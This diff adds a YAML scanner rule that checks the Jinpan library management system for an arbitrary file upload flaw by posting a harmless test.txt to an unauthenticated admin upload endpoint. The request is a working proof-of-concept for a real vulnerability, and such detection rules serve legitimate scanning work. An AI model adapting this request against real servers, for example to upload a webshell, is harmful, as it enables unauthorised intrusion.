@@ -1,0 +1,14 @@
+name: jinpan-upload
+rules:
+  - method: POST
+    path: "/pages/admin/tools/uploadFile/doUpload.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
+    body: "--399e563f0389566bd40fd4d6409a67dd\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\n\ntest\n--399e563f0389566bd40fd4d6409a67dd--"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"success")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "金盘系统 任意文件上传漏洞"
